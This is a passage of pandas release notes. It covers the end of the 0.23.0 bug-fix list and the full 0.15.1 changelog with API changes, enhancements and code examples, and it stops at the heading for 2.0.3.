``dtype='timedelta64[ns]'`` where addition or subtraction of ``TimedeltaIndex`` could return a ``Series`` with an incorrect name (:issue:`19043`)\n- Bug in :func:`Timedelta.__floordiv__` and :func:`Timedelta.__rfloordiv__` dividing by many incompatible numpy objects was incorrectly allowed (:issue:`18846`)\n- Bug where dividing a scalar timedelta-like object with :class:`TimedeltaIndex` performed the reciprocal operation (:issue:`19125`)\n- Bug in :class:`TimedeltaIndex` where division by a ``Series`` would return a ``TimedeltaIndex`` instead of a ``Series`` (:issue:`19042`)\n- Bug in :func:`Timedelta.__add__`, :func:`Timedelta.__sub__` where adding or subtracting a ``np.timedelta64`` object would return another ``np.timedelta64`` instead of a ``Timedelta`` (:issue:`19738`)\n- Bug in :func:`Timedelta.__floordiv__`, :func:`Timedelta.__rfloordiv__` where operating with a ``Tick`` object would raise a ``TypeError`` instead of returning a numeric value (:issue:`19738`)\n- Bug in :func:`Period.asfreq` where periods near ``datetime(1, 1, 1)`` could be converted incorrectly (:issue:`19643`, :issue:`19834`)\n- Bug in :func:`Timedelta.total_seconds()` causing precision errors, for example ``Timedelta('30S').total_seconds()==30.000000000000004`` (:issue:`19458`)\n- Bug in :func:`Timedelta.__rmod__` where operating with a ``numpy.timedelta64`` returned a ``timedelta64`` object instead of a ``Timedelta`` (:issue:`19820`)\n- Multiplication of :class:`TimedeltaIndex` by ``TimedeltaIndex`` will now raise ``TypeError`` instead of raising ``ValueError`` in cases of length mismatch (:issue:`19333`)\n- Bug in indexing a :class:`TimedeltaIndex` with a ``np.timedelta64`` object which was raising a ``TypeError`` (:issue:`20393`)\n\n\nTimezones\n^^^^^^^^^\n\n- Bug in creating a ``Series`` from an array that contains both tz-naive and tz-aware values will result in a ``Series`` whose dtype is tz-aware instead of object (:issue:`16406`)\n- Bug in comparison of timezone-aware :class:`DatetimeIndex` against ``NaT`` incorrectly raising ``TypeError`` (:issue:`19276`)\n- Bug in :meth:`DatetimeIndex.astype` when converting between timezone aware dtypes, and converting from timezone aware to naive (:issue:`18951`)\n- Bug in comparing :class:`DatetimeIndex`, which failed to raise ``TypeError`` when attempting to compare timezone-aware and timezone-naive datetimelike objects (:issue:`18162`)\n- Bug in localization of a naive, datetime string in a ``Series`` constructor with a ``datetime64[ns, tz]`` dtype (:issue:`174151`)\n- :func:`Timestamp.replace` will now handle Daylight Savings transitions gracefully (:issue:`18319`)\n- Bug in tz-aware :class:`DatetimeIndex` where addition/subtraction with a :class:`TimedeltaIndex` or array with ``dtype='timedelta64[ns]'`` was incorrect (:issue:`17558`)\n- Bug in :func:`DatetimeIndex.insert` where inserting ``NaT`` into a timezone-aware index incorrectly raised (:issue:`16357`)\n- Bug in :class:`DataFrame` constructor, where tz-aware Datetimeindex and a given column name will result in an empty ``DataFrame`` (:issue:`19157`)\n- Bug in :func:`Timestamp.tz_localize` where localizing a timestamp near the minimum or maximum valid values could overflow and return a timestamp with an incorrect nanosecond value (:issue:`12677`)\n- Bug when iterating over :class:`DatetimeIndex` that was localized with fixed timezone offset that rounded nanosecond precision to microseconds (:issue:`19603`)\n- Bug in :func:`DataFrame.diff` that raised an ``IndexError`` with tz-aware values (:issue:`18578`)\n- Bug in :func:`melt` that converted tz-aware dtypes to tz-naive (:issue:`15785`)\n- Bug in :func:`Dataframe.count` that raised an ``ValueError``, if :func:`Dataframe.dropna` was called for a single column with timezone-aware values. (:issue:`13407`)\n\nOffsets\n^^^^^^^\n\n- Bug in :class:`WeekOfMonth` and :class:`Week` where addition and subtraction did not roll correctly (:issue:`18510`, :issue:`18672`, :issue:`18864`)\n- Bug in :class:`WeekOfMonth` and :class:`LastWeekOfMonth` where default keyword arguments for constructor raised ``ValueError`` (:issue:`19142`)\n- Bug in :class:`FY5253Quarter`, :class:`LastWeekOfMonth` where rollback and rollforward behavior was inconsistent with addition and subtraction behavior (:issue:`18854`)\n- Bug in :class:`FY5253` where ``datetime`` addition and subtraction incremented incorrectly for dates on the year-end but not normalized to midnight (:issue:`18854`)\n- Bug in :class:`FY5253` where date offsets could incorrectly raise an ``AssertionError`` in arithmetic operations (:issue:`14774`)\n\nNumeric\n^^^^^^^\n- Bug in :class:`Series` constructor with an int or float list where specifying ``dtype=str``, ``dtype='str'`` or ``dtype='U'`` failed to convert the data elements to strings (:issue:`16605`)\n- Bug in :class:`Index` multiplication and division methods where operating with a ``Series`` would return an ``Index`` object instead of a ``Series`` object (:issue:`19042`)\n- Bug in the :class:`DataFrame` constructor in which data containing very large positive or very large negative numbers was causing ``OverflowError`` (:issue:`18584`)\n- Bug in :class:`Index` constructor with ``dtype='uint64'`` where int-like floats were not coerced to :class:`UInt64Index` (:issue:`18400`)\n- Bug in :class:`DataFrame` flex arithmetic (e.g. ``df.add(other, fill_value=foo)``) with a ``fill_value`` other than ``None`` failed to raise ``NotImplementedError`` in corner cases where either the frame or ``other`` has length zero (:issue:`19522`)\n- Multiplication and division of numeric-dtyped :class:`Index` objects with timedelta-like scalars returns ``TimedeltaIndex`` instead of raising ``TypeError`` (:issue:`19333`)\n- Bug where ``NaN`` was returned instead of 0 by :func:`Series.pct_change` and :func:`DataFrame.pct_change` when ``fill_method`` is not ``None`` (:issue:`19873`)\n\nStrings\n^^^^^^^\n- Bug in :func:`Series.str.get` with a dictionary in the values and the index not in the keys, raising ``KeyError`` (:issue:`20671`)\n\n\nIndexing\n^^^^^^^^\n\n- Bug in :class:`Index` construction from list of mixed type tuples (:issue:`18505`)\n- Bug in :func:`Index.drop` when passing a list of both tuples and non-tuples (:issue:`18304`)\n- Bug in :func:`DataFrame.drop`, :meth:`Panel.drop`, :meth:`Series.drop`, :meth:`Index.drop` where no ``KeyError`` is raised when dropping a non-existent element from an axis that contains duplicates (:issue:`19186`)\n- Bug in indexing a datetimelike ``Index`` that raised ``ValueError`` instead of ``IndexError`` (:issue:`18386`).\n- :func:`Index.to_series` now accepts ``index`` and ``name`` kwargs (:issue:`18699`)\n- :func:`DatetimeIndex.to_series` now accepts ``index`` and ``name`` kwargs (:issue:`18699`)\n- Bug in indexing non-scalar value from ``Series`` having non-unique ``Index`` will return value flattened (:issue:`17610`)\n- Bug in indexing with iterator containing only missing keys, which raised no error (:issue:`20748`)\n- Fixed inconsistency in ``.ix`` between list and scalar keys when the index has integer dtype and does not include the desired keys (:issue:`20753`)\n- Bug in ``__setitem__`` when indexing a :class:`DataFrame` with a 2-d boolean ndarray (:issue:`18582`)\n- Bug in ``str.extractall`` when there were no matches empty :class:`Index` was returned instead of appropriate :class:`MultiIndex` (:issue:`19034`)\n- Bug in :class:`IntervalIndex` where empty and purely NA data was constructed inconsistently depending on the construction method (:issue:`18421`)\n- Bug in :func:`IntervalIndex.symmetric_difference` where the symmetric difference with a non-``IntervalIndex`` did not raise (:issue:`18475`)\n- Bug in :class:`IntervalIndex` where set operations that returned an empty ``IntervalIndex`` had the wrong dtype (:issue:`19101`)\n- Bug in :meth:`DataFrame.drop_duplicates` where no ``KeyError`` is raised when passing in columns that don't exist on the ``DataFrame`` (:issue:`19726`)\n- Bug in ``Index`` subclasses constructors that ignore unexpected keyword arguments (:issue:`19348`)\n- Bug in :meth:`Index.difference` when taking difference of an ``Index`` with itself (:issue:`20040`)\n- Bug in :meth:`DataFrame.first_valid_index` and :meth:`DataFrame.last_valid_index` in presence of entire rows of NaNs in the middle of values (:issue:`20499`).\n- Bug in :class:`IntervalIndex` where some indexing operations were not supported for overlapping or non-monotonic ``uint64`` data (:issue:`20636`)\n- Bug in ``Series.is_unique`` where extraneous output in stderr is shown if Series contains objects with ``__ne__`` defined (:issue:`20661`)\n- Bug in ``.loc`` assignment with a single-element list-like incorrectly assigns as a list (:issue:`19474`)\n- Bug in partial string indexing on a ``Series/DataFrame`` with a monotonic decreasing ``DatetimeIndex`` (:issue:`19362`)\n- Bug in performing in-place operations on a ``DataFrame`` with a duplicate ``Index`` (:issue:`17105`)\n- Bug in :meth:`IntervalIndex.get_loc` and :meth:`IntervalIndex.get_indexer` when used with an :class:`IntervalIndex` containing a single interval (:issue:`17284`, :issue:`20921`)\n- Bug in ``.loc`` with a ``uint64`` indexer (:issue:`20722`)\n\nMultiIndex\n^^^^^^^^^^\n\n- Bug in :func:`MultiIndex.__contains__` where non-tuple keys would return ``True`` even if they had been dropped (:issue:`19027`)\n- Bug in :func:`MultiIndex.set_labels` which would cause casting (and potentially clipping) of the new labels if the ``level`` argument is not 0 or a list like [0, 1, ... ]  (:issue:`19057`)\n- Bug in :func:`MultiIndex.get_level_values` which would return an invalid index on level of ints with missing values (:issue:`17924`)\n- Bug in :func:`MultiIndex.unique` when called on empty :class:`MultiIndex` (:issue:`20568`)\n- Bug in :func:`MultiIndex.unique` which would not preserve level names (:issue:`20570`)\n- Bug in :func:`MultiIndex.remove_unused_levels` which would fill nan values (:issue:`18417`)\n- Bug in :func:`MultiIndex.from_tuples` which would fail to take zipped tuples in python3 (:issue:`18434`)\n- Bug in :func:`MultiIndex.get_loc` which would fail to automatically cast values between float and int (:issue:`18818`, :issue:`15994`)\n- Bug in :func:`MultiIndex.get_loc` which would cast boolean to integer labels (:issue:`19086`)\n- Bug in :func:`MultiIndex.get_loc` which would fail to locate keys containing ``NaN`` (:issue:`18485`)\n- Bug in :func:`MultiIndex.get_loc` in large :class:`MultiIndex`, would fail when levels had different dtypes (:issue:`18520`)\n- Bug in indexing where nested indexers having only numpy arrays are handled incorrectly (:issue:`19686`)\n\n\nIO\n^^\n\n- :func:`read_html` now rewinds seekable IO objects after parse failure, before attempting to parse with a new parser. If a parser errors and the object is non-seekable, an informative error is raised suggesting the use of a different parser (:issue:`17975`)\n- :meth:`DataFrame.to_html` now has an option to add an id to the leading ``<table>`` tag (:issue:`8496`)\n- Bug in :func:`read_msgpack` with a non existent file is passed in Python 2 (:issue:`15296`)\n- Bug in :func:`read_csv` where a ``MultiIndex`` with duplicate columns was not being mangled appropriately (:issue:`18062`)\n- Bug in :func:`read_csv` where missing values were not being handled properly when ``keep_default_na=False`` with dictionary ``na_values`` (:issue:`19227`)\n- Bug in :func:`read_csv` causing heap corruption on 32-bit, big-endian architectures (:issue:`20785`)\n- Bug in :func:`read_sas` where a file with 0 variables gave an ``AttributeError`` incorrectly. Now it gives an ``EmptyDataError`` (:issue:`18184`)\n- Bug in :func:`DataFrame.to_latex()` where pairs of braces meant to serve as invisible placeholders were escaped (:issue:`18667`)\n- Bug in :func:`DataFrame.to_latex()` where a ``NaN`` in a ``MultiIndex`` would cause an ``IndexError`` or incorrect output (:issue:`14249`)\n- Bug in :func:`DataFrame.to_latex()` where a non-string index-level name would result in an ``AttributeError`` (:issue:`19981`)\n- Bug in :func:`DataFrame.to_latex()` where the combination of an index name and the ``index_names=False`` option would result in incorrect output (:issue:`18326`)\n- Bug in :func:`DataFrame.to_latex()` where a ``MultiIndex`` with an empty string as its name would result in incorrect output (:issue:`18669`)\n- Bug in :func:`DataFrame.to_latex()` where missing space characters caused wrong escaping and produced non-valid latex in some cases (:issue:`20859`)\n- Bug in :func:`read_json` where large numeric values were causing an ``OverflowError`` (:issue:`18842`)\n- Bug in :func:`DataFrame.to_parquet` where an exception was raised if the write destination is S3 (:issue:`19134`)\n- :class:`Interval` now supported in :func:`DataFrame.to_excel` for all Excel file types (:issue:`19242`)\n- :class:`Timedelta` now supported in :func:`DataFrame.to_excel` for all Excel file types (:issue:`19242`, :issue:`9155`, :issue:`19900`)\n- Bug in :meth:`pandas.io.stata.StataReader.value_labels` raising an ``AttributeError`` when called on very old files. Now returns an empty dict (:issue:`19417`)\n- Bug in :func:`read_pickle` when unpickling objects with :class:`TimedeltaIndex` or :class:`Float64Index` created with pandas prior to version 0.20 (:issue:`19939`)\n- Bug in :meth:`pandas.io.json.json_normalize` where sub-records are not properly normalized if any sub-records values are NoneType (:issue:`20030`)\n- Bug in ``usecols`` parameter in :func:`read_csv` where error is not raised correctly when passing a string. (:issue:`20529`)\n- Bug in :func:`HDFStore.keys` when reading a file with a soft link causes exception (:issue:`20523`)\n- Bug in :func:`HDFStore.select_column` where a key which is not a valid store raised an ``AttributeError`` instead of a ``KeyError`` (:issue:`17912`)\n\nPlotting\n^^^^^^^^\n\n- Better error message when attempting to plot but matplotlib is not installed (:issue:`19810`).\n- :func:`DataFrame.plot` now raises a ``ValueError`` when the ``x`` or ``y`` argument is improperly formed (:issue:`18671`)\n- Bug in :func:`DataFrame.plot` when ``x`` and ``y`` arguments given as positions caused incorrect referenced columns for line, bar and area plots (:issue:`20056`)\n- Bug in formatting tick labels with ``datetime.time()`` and fractional seconds (:issue:`18478`).\n- :meth:`Series.plot.kde` has exposed the args ``ind`` and ``bw_method`` in the docstring (:issue:`18461`). The argument ``ind`` may now also be an integer (number of sample points).\n- :func:`DataFrame.plot` now supports multiple columns to the ``y`` argument (:issue:`19699`)\n\n\nGroupBy/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Bug when grouping by a single column and aggregating with a class like ``list`` or ``tuple`` (:issue:`18079`)\n- Fixed regression in :func:`DataFrame.groupby` which would not emit an error when called with a tuple key not in the index (:issue:`18798`)\n- Bug in :func:`DataFrame.resample` which silently ignored unsupported (or mistyped) options for ``label``, ``closed`` and ``convention`` (:issue:`19303`)\n- Bug in :func:`DataFrame.groupby` where tuples were interpreted as lists of keys rather than as keys (:issue:`17979`, :issue:`18249`)\n- Bug in :func:`DataFrame.groupby` where aggregation by ``first``/``last``/``min``/``max`` was causing timestamps to lose precision (:issue:`19526`)\n- Bug in :func:`DataFrame.transform` where particular aggregation functions were being incorrectly cast to match the dtype(s) of the grouped data (:issue:`19200`)\n- Bug in :func:`DataFrame.groupby` passing the ``on=`` kwarg, and subsequently using ``.apply()`` (:issue:`17813`)\n- Bug in :func:`DataFrame.resample().aggregate <.Resampler.aggregate>` not raising a ``KeyError`` when aggregating a non-existent column (:issue:`16766`, :issue:`19566`)\n- Bug in :func:`DataFrameGroupBy.cumsum` and :func:`DataFrameGroupBy.cumprod` when ``skipna`` was passed (:issue:`19806`)\n- Bug in :func:`DataFrame.resample` that dropped timezone information (:issue:`13238`)\n- Bug in :func:`DataFrame.groupby` where transformations using ``np.all`` and ``np.any`` were raising a ``ValueError`` (:issue:`20653`)\n- Bug in :func:`DataFrame.resample` where ``ffill``, ``bfill``, ``pad``, ``backfill``, ``fillna``, ``interpolate``, and ``asfreq`` were ignoring ``loffset``. (:issue:`20744`)\n- Bug in :func:`DataFrame.groupby` when applying a function that has mixed data types and the user supplied function can fail on the grouping column (:issue:`20949`)\n- Bug in :func:`DataFrameGroupBy.rolling().apply() <.Rolling.apply>` where operations performed against the associated :class:`DataFrameGroupBy` object could impact the inclusion of the grouped item(s) in the result (:issue:`14013`)\n\nSparse\n^^^^^^\n\n- Bug in which creating a :class:`SparseDataFrame` from a dense ``Series`` or an unsupported type raised an uncontrolled exception (:issue:`19374`)\n- Bug in :class:`SparseDataFrame.to_csv` causing exception (:issue:`19384`)\n- Bug in :class:`SparseSeries.memory_usage` which caused segfault by accessing non sparse elements (:issue:`19368`)\n- Bug in constructing a :class:`SparseArray`: if ``data`` is a scalar and ``index`` is defined it will coerce to ``float64`` regardless of scalar's dtype. (:issue:`19163`)\n\nReshaping\n^^^^^^^^^\n\n- Bug in :func:`DataFrame.merge` where referencing a ``CategoricalIndex`` by name, where the ``by`` kwarg would ``KeyError`` (:issue:`20777`)\n- Bug in :func:`DataFrame.stack` which fails trying to sort mixed type levels under Python 3 (:issue:`18310`)\n- Bug in :func:`DataFrame.unstack` which casts int to float if ``columns`` is a ``MultiIndex`` with unused levels (:issue:`17845`)\n- Bug in :func:`DataFrame.unstack` which raises an error if ``index`` is a ``MultiIndex`` with unused labels on the unstacked level (:issue:`18562`)\n- Fixed construction of a :class:`Series` from a ``dict`` containing ``NaN`` as key (:issue:`18480`)\n- Fixed construction of a :class:`DataFrame` from a ``dict`` containing ``NaN`` as key (:issue:`18455`)\n- Disabled construction of a :class:`Series` where len(index) > len(data) = 1, which previously would broadcast the data item, and now raises a ``ValueError`` (:issue:`18819`)\n- Suppressed error in the construction of a :class:`DataFrame` from a ``dict`` containing scalar values when the corresponding keys are not included in the passed index (:issue:`18600`)\n\n- Fixed (changed from ``object`` to ``float64``) dtype of :class:`DataFrame` initialized with axes, no data, and ``dtype=int`` (:issue:`19646`)\n- Bug in :func:`Series.rank` where ``Series`` containing ``NaT`` modifies the ``Series`` inplace (:issue:`18521`)\n- Bug in :func:`cut` which fails when using readonly arrays (:issue:`18773`)\n- Bug in :func:`DataFrame.pivot_table` which fails when the ``aggfunc`` arg is of type string.  The behavior is now consistent with other methods like ``agg`` and ``apply`` (:issue:`18713`)\n- Bug in :func:`DataFrame.merge` in which merging using ``Index`` objects as vectors raised an Exception (:issue:`19038`)\n- Bug in :func:`DataFrame.stack`, :func:`DataFrame.unstack`, :func:`Series.unstack` which were not returning subclasses (:issue:`15563`)\n- Bug in timezone comparisons, manifesting as a conversion of the index to UTC in ``.concat()`` (:issue:`18523`)\n- Bug in :func:`concat` when concatenating sparse and dense series it returns only a ``SparseDataFrame``. Should be a ``DataFrame``. (:issue:`18914`, :issue:`18686`, and :issue:`16874`)\n- Improved error message for :func:`DataFrame.merge` when there is no common merge key (:issue:`19427`)\n- Bug in :func:`DataFrame.join` which does an ``outer`` instead of a ``left`` join when being called with multiple DataFrames and some have non-unique indices (:issue:`19624`)\n- :func:`Series.rename` now accepts ``axis`` as a kwarg (:issue:`18589`)\n- Bug in :func:`~DataFrame.rename` where an Index of same-length tuples was converted to a MultiIndex (:issue:`19497`)\n- Comparisons between :class:`Series` and :class:`Index` would return a ``Series`` with an incorrect name, ignoring the ``Index``'s name attribute (:issue:`19582`)\n- Bug in :func:`qcut` where datetime and timedelta data with ``NaT`` present raised a ``ValueError`` (:issue:`19768`)\n- Bug in :func:`DataFrame.iterrows`, which would infers strings not compliant to `ISO8601 <https://en.wikipedia.org/wiki/ISO_8601>`_ to datetimes (:issue:`19671`)\n- Bug in :class:`Series` constructor with ``Categorical`` where a ``ValueError`` is not raised when an index of different length is given (:issue:`19342`)\n- Bug in :meth:`DataFrame.astype` where column metadata is lost when converting to categorical or a dictionary of dtypes (:issue:`19920`)\n- Bug in :func:`cut` and :func:`qcut` where timezone information was dropped (:issue:`19872`)\n- Bug in :class:`Series` constructor with a ``dtype=str``, previously raised in some cases (:issue:`19853`)\n- Bug in :func:`get_dummies`, and :func:`select_dtypes`, where duplicate column names caused incorrect behavior (:issue:`20848`)\n- Bug in :func:`isna`, which cannot handle ambiguous typed lists (:issue:`20675`)\n- Bug in :func:`concat` which raises an error when concatenating TZ-aware dataframes and all-NaT dataframes (:issue:`12396`)\n- Bug in :func:`concat` which raises an error when concatenating empty TZ-aware series (:issue:`18447`)\n\nOther\n^^^^^\n\n- Improved error message when attempting to use a Python keyword as an identifier in a ``numexpr`` backed query (:issue:`18221`)\n- Bug in accessing a :func:`pandas.get_option`, which raised ``KeyError`` rather than ``OptionError`` when looking up a non-existent option key in some cases (:issue:`19789`)\n- Bug in :func:`testing.assert_series_equal` and :func:`testing.assert_frame_equal` for Series or DataFrames with differing unicode data (:issue:`20503`)\n\n.. _whatsnew_0.23.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.22.0..v0.23.0\n\n\n.. _whatsnew_0151:\n\nVersion 0.15.1 (November 9, 2014)\n---------------------------------\n\n{{ header }}\n\n\nThis is a minor bug-fix release from 0.15.0 and includes a small number of API changes, several new features,\nenhancements, and performance improvements along with a large number of bug fixes. We recommend that all\nusers upgrade to this version.\n\n- :ref:`Enhancements <whatsnew_0151.enhancements>`\n- :ref:`API Changes <whatsnew_0151.api>`\n- :ref:`Bug Fixes <whatsnew_0151.bug_fixes>`\n\n.. _whatsnew_0151.api:\n\nAPI changes\n~~~~~~~~~~~\n\n- ``s.dt.hour`` and other ``.dt`` accessors will now return ``np.nan`` for missing values (rather than previously -1), (:issue:`8689`)\n\n  .. ipython:: python\n\n     s = pd.Series(pd.date_range(\"20130101\", periods=5, freq=\"D\"))\n     s.iloc[2] = np.nan\n     s\n\n  previous behavior:\n\n  .. code-block:: ipython\n\n     In [6]: s.dt.hour\n     Out[6]:\n     0    0\n     1    0\n     2   -1\n     3    0\n     4    0\n     dtype: int64\n\n  current behavior:\n\n  .. ipython:: python\n\n     s.dt.hour\n\n- ``groupby`` with ``as_index=False`` will not add erroneous extra columns to\n  result (:issue:`8582`):\n\n  .. ipython:: python\n\n     np.random.seed(2718281)\n     df = pd.DataFrame(np.random.randint(0, 100, (10, 2)), columns=[\"jim\", \"joe\"])\n     df.head()\n\n     ts = pd.Series(5 * np.random.randint(0, 3, 10))\n\n  previous behavior:\n\n  .. code-block:: ipython\n\n     In [4]: df.groupby(ts, as_index=False).max()\n     Out[4]:\n        NaN  jim  joe\n     0    0   72   83\n     1    5   77   84\n     2   10   96   65\n\n  current behavior:\n\n  .. code-block:: ipython\n\n     In [4]: df.groupby(ts, as_index=False).max()\n     Out[4]:\n        jim  joe\n     0   72   83\n     1   77   84\n     2   96   65\n\n- ``groupby`` will not erroneously exclude columns if the column name conflicts\n  with the grouper name (:issue:`8112`):\n\n  .. ipython:: python\n\n     df = pd.DataFrame({\"jim\": range(5), \"joe\": range(5, 10)})\n     df\n     gr = df.groupby(df[\"jim\"] < 2)\n\n  previous behavior (excludes 1st column from output):\n\n  .. code-block:: ipython\n\n     In [4]: gr.apply(sum)\n     Out[4]:\n            joe\n     jim\n     False   24\n     True    11\n\n  current behavior:\n\n  .. ipython:: python\n     :okwarning:\n\n     gr.apply(sum)\n\n- Support for slicing with monotonic decreasing indexes, even if ``start`` or ``stop`` is\n  not found in the index (:issue:`7860`):\n\n  .. ipython:: python\n\n    s = pd.Series([\"a\", \"b\", \"c\", \"d\"], [4, 3, 2, 1])\n    s\n\n  previous behavior:\n\n  .. code-block:: ipython\n\n     In [8]: s.loc[3.5:1.5]\n     KeyError: 3.5\n\n  current behavior:\n\n  .. ipython:: python\n\n     s.loc[3.5:1.5]\n\n- ``io.data.Options`` has been fixed for a change in the format of the Yahoo Options page (:issue:`8612`), (:issue:`8741`)\n\n  .. note::\n\n    As a result of a change in Yahoo's option page layout, when an expiry date is given,\n    ``Options`` methods now return data for a single expiry date.  Previously, methods returned all\n    data for the selected month.\n\n  The ``month`` and ``year`` parameters have been undeprecated and can be used to get all\n  options data for a given month.\n\n  If an expiry date that is not valid is given, data for the next expiry after the given\n  date is returned.\n\n  Option data frames are now saved on the instance as ``callsYYMMDD`` or ``putsYYMMDD``.  Previously\n  they were saved as ``callsMMYY`` and ``putsMMYY``.  The next expiry is saved as ``calls`` and ``puts``.\n\n  New features:\n\n  - The expiry parameter can now be a single date or a list-like object containing dates.\n\n  - A new property ``expiry_dates`` was added, which returns all available expiry dates.\n\n  Current behavior:\n\n  .. code-block:: ipython\n\n      In [17]: from pandas.io.data import Options\n\n      In [18]: aapl = Options('aapl', 'yahoo')\n\n      In [19]: aapl.get_call_data().iloc[0:5, 0:1]\n      Out[19]:\n                                                   Last\n      Strike Expiry     Type Symbol\n      80     2014-11-14 call AAPL141114C00080000  29.05\n      84     2014-11-14 call AAPL141114C00084000  24.80\n      85     2014-11-14 call AAPL141114C00085000  24.05\n      86     2014-11-14 call AAPL141114C00086000  22.76\n      87     2014-11-14 call AAPL141114C00087000  21.74\n\n      In [20]: aapl.expiry_dates\n      Out[20]:\n      [datetime.date(2014, 11, 14),\n       datetime.date(2014, 11, 22),\n       datetime.date(2014, 11, 28),\n       datetime.date(2014, 12, 5),\n       datetime.date(2014, 12, 12),\n       datetime.date(2014, 12, 20),\n       datetime.date(2015, 1, 17),\n       datetime.date(2015, 2, 20),\n       datetime.date(2015, 4, 17),\n       datetime.date(2015, 7, 17),\n       datetime.date(2016, 1, 15),\n       datetime.date(2017, 1, 20)]\n\n      In [21]: aapl.get_near_stock_price(expiry=aapl.expiry_dates[0:3]).iloc[0:5, 0:1]\n      Out[21]:\n                                                  Last\n      Strike Expiry     Type Symbol\n      109    2014-11-22 call AAPL141122C00109000  1.48\n             2014-11-28 call AAPL141128C00109000  1.79\n      110    2014-11-14 call AAPL141114C00110000  0.55\n             2014-11-22 call AAPL141122C00110000  1.02\n             2014-11-28 call AAPL141128C00110000  1.32\n\n.. _whatsnew_0151.datetime64_plotting:\n\n- pandas now also registers the ``datetime64`` dtype in matplotlib's units registry\n  to plot such values as datetimes. This is activated once pandas is imported. In\n  previous versions, plotting an array of ``datetime64`` values will have resulted\n  in plotted integer values. To keep the previous behaviour, you can do\n  ``del matplotlib.units.registry[np.datetime64]`` (:issue:`8614`).\n\n\n.. _whatsnew_0151.enhancements:\n\nEnhancements\n~~~~~~~~~~~~\n\n- ``concat`` permits a wider variety of iterables of pandas objects to be\n  passed as the first parameter (:issue:`8645`):\n\n  .. ipython:: python\n\n     from collections import deque\n\n     df1 = pd.DataFrame([1, 2, 3])\n     df2 = pd.DataFrame([4, 5, 6])\n\n  previous behavior:\n\n  .. code-block:: ipython\n\n     In [7]: pd.concat(deque((df1, df2)))\n     TypeError: first argument must be a list-like of pandas objects, you passed an object of type \"deque\"\n\n  current behavior:\n\n  .. ipython:: python\n\n     pd.concat(deque((df1, df2)))\n\n- Represent ``MultiIndex`` labels with a dtype that utilizes memory based on the level size. In prior versions, the memory usage was a constant 8 bytes per element in each level. In addition, in prior versions, the *reported* memory usage was incorrect as it didn't show the usage for the memory occupied by the underling data array. (:issue:`8456`)\n\n  .. ipython:: python\n\n     dfi = pd.DataFrame(\n         1, index=pd.MultiIndex.from_product([[\"a\"], range(1000)]), columns=[\"A\"]\n     )\n\n  previous behavior:\n\n  .. code-block:: ipython\n\n      this was underreported in prior versions\n     In [1]: dfi.memory_usage(index=True)\n     Out[1]:\n     Index    8000  took about 24008 bytes in < 0.15.1\n     A        8000\n     dtype: int64\n\n\n  current behavior:\n\n  .. ipython:: python\n\n     dfi.memory_usage(index=True)\n\n- Added Index properties ``is_monotonic_increasing`` and ``is_monotonic_decreasing`` (:issue:`8680`).\n\n- Added option to select columns when importing Stata files (:issue:`7935`)\n\n- Qualify memory usage in ``DataFrame.info()`` by adding ``+`` if it is a lower bound (:issue:`8578`)\n\n- Raise errors in certain aggregation cases where an argument such as ``numeric_only`` is not handled (:issue:`8592`).\n\n- Added support for 3-character ISO and non-standard country codes in :func:`io.wb.download()` (:issue:`8482`)\n\n- World Bank data requests now will warn/raise based\n  on an ``errors`` argument, as well as a list of hard-coded country codes and\n  the World Bank's JSON response.  In prior versions, the error messages\n  didn't look at the World Bank's JSON response.  Problem-inducing input were\n  simply dropped prior to the request. The issue was that many good countries\n  were cropped in the hard-coded approach.  All countries will work now, but\n  some bad countries will raise exceptions because some edge cases break the\n  entire response. (:issue:`8482`)\n\n- Added option to ``Series.str.split()`` to return a ``DataFrame`` rather than a ``Series`` (:issue:`8428`)\n\n- Added option to ``df.info(null_counts=None|True|False)`` to override the default display options and force showing of the null-counts (:issue:`8701`)\n\n\n.. _whatsnew_0151.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n- Bug in unpickling of a ``CustomBusinessDay`` object (:issue:`8591`)\n- Bug in coercing ``Categorical`` to a records array, e.g. ``df.to_records()`` (:issue:`8626`)\n- Bug in ``Categorical`` not created properly with ``Series.to_frame()`` (:issue:`8626`)\n- Bug in coercing in astype of a ``Categorical`` of a passed ``pd.Categorical`` (this now raises ``TypeError`` correctly), (:issue:`8626`)\n- Bug in ``cut``/``qcut`` when using ``Series`` and ``retbins=True`` (:issue:`8589`)\n- Bug in writing Categorical columns to an SQL database with ``to_sql`` (:issue:`8624`).\n- Bug in comparing ``Categorical`` of datetime raising when being compared to a scalar datetime (:issue:`8687`)\n- Bug in selecting from a ``Categorical`` with ``.iloc`` (:issue:`8623`)\n- Bug in groupby-transform with a Categorical (:issue:`8623`)\n- Bug in duplicated/drop_duplicates with a Categorical (:issue:`8623`)\n- Bug in ``Categorical`` reflected comparison operator raising if the first argument was a numpy array scalar (e.g. np.int64) (:issue:`8658`)\n- Bug in Panel indexing with a list-like (:issue:`8710`)\n- Compat issue is ``DataFrame.dtypes`` when ``options.mode.use_inf_as_null`` is True (:issue:`8722`)\n- Bug in ``read_csv``, ``dialect`` parameter would not take a string (:issue:`8703`)\n- Bug in slicing a MultiIndex level with an empty-list (:issue:`8737`)\n- Bug in numeric index operations of add/sub with Float/Index Index with numpy arrays (:issue:`8608`)\n- Bug in setitem with empty indexer and unwanted coercion of dtypes (:issue:`8669`)\n- Bug in ix/loc block splitting on setitem (manifests with integer-like dtypes, e.g. datetime64) (:issue:`8607`)\n- Bug when doing label based indexing with integers not found in the index for\n  non-unique but monotonic indexes (:issue:`8680`).\n- Bug when indexing a Float64Index with ``np.nan`` on numpy 1.7 (:issue:`8980`).\n- Fix ``shape`` attribute for ``MultiIndex`` (:issue:`8609`)\n- Bug in ``GroupBy`` where a name conflict between the grouper and columns\n  would break ``groupby`` operations (:issue:`7115`, :issue:`8112`)\n- Fixed a bug where plotting a column ``y`` and specifying a label would mutate the index name of the original DataFrame (:issue:`8494`)\n- Fix regression in plotting of a DatetimeIndex directly with matplotlib (:issue:`8614`).\n- Bug in ``date_range`` where partially-specified dates would incorporate current date (:issue:`6961`)\n- Bug in Setting by indexer to a scalar value with a mixed-dtype ``Panel4d`` was failing (:issue:`8702`)\n- Bug where ``DataReader``'s would fail if one of the symbols passed was invalid.  Now returns data for valid symbols and np.nan for invalid (:issue:`8494`)\n- Bug in ``get_quote_yahoo`` that wouldn't allow non-float return values (:issue:`5229`).\n\n\n.. _whatsnew_0.15.1.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.15.0..v0.15.1\n\n\n.. _whatsnew_203:\n\nWhat's new in 2.0.3 